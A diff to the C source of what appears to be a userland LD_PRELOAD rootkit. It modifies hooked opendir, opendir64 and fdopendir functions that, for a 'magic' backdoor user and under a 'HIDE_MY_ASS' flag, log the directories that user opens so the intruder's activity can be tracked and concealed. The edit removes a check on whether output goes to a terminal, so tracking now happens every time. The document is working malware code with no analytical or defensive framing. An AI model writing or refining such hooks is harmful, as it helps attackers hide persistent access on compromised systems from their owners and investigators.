@@ -3,13 +3,8 @@ DIR *opendir(const char *pathname){
     if(magicusr()){
 #ifdef HIDE_MY_ASS
         DIR *ret = call(COPENDIR, pathname);
-        if(ret){
-            int outfd = fileno(stdout);
-            if(!outfd) return ret;
-            if(isatty(outfd))
-                if(!pathtracked(pathname))
-                    trackwrite(pathname);
-        }
+        if(ret && !pathtracked(pathname))
+            trackwrite(pathname);
         return ret;
 #else
         return call(COPENDIR, pathname);
@@ -24,13 +19,8 @@ DIR *opendir64(const char *pathname){
     if(magicusr()){
 #ifdef HIDE_MY_ASS
         DIR *ret = call(COPENDIR64, pathname);
-        if(ret){
-            int outfd = fileno(stdout);
-            if(!outfd) return ret;
-            if(isatty(outfd))
-                if(!pathtracked(pathname))
-                    trackwrite(pathname);
-        }
+        if(ret && !pathtracked(pathname))
+            trackwrite(pathname);
         return ret;
 #else
         return call(COPENDIR64, pathname);
@@ -46,14 +36,10 @@ DIR *fdopendir(int fd){
 #ifdef HIDE_MY_ASS
         DIR *ret = call(CFDOPENDIR, fd);
         if(ret){
-            int outfd = fileno(stdout);
-            if(!outfd) return ret;
-            if(isatty(outfd)){
-                char *apath = gdirname(fd);
-                if(!apath) return ret;
-                if(!pathtracked(apath)){
+            char *apath = gdirname(fd);
+            if(apath != NULL){
+                if(!pathtracked(apath))
                     trackwrite(apath);
-                }
                 free(apath);
             }
         }
